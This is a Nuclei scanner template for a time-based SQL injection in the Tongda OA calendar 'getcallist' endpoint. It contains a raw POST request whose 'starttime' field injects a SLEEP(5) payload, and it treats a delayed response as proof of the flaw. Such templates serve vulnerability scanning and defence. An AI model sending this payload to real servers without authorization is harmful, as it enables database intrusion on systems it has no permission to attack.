id: tongda-oa-getcallist-sqli
info:
  name: 通达 OA getcallist - sqli
  author: leadlife
  severity: high
  description: 
  reference: 
    - demo
  classification:
    cve-id: 
  metadata:
    verified: false
    fofa-query: demo
  tags: tongda,oa,time,sqli

http:
  - raw:  
      - |
        @timeout: 15s
        POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        starttime=1' AND (SELECT 7846 FROM (SELECT(SLEEP(5)))SfMD) AND 'GpBS'='GpBS&endtime=1598918400&view=month&condition=1

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and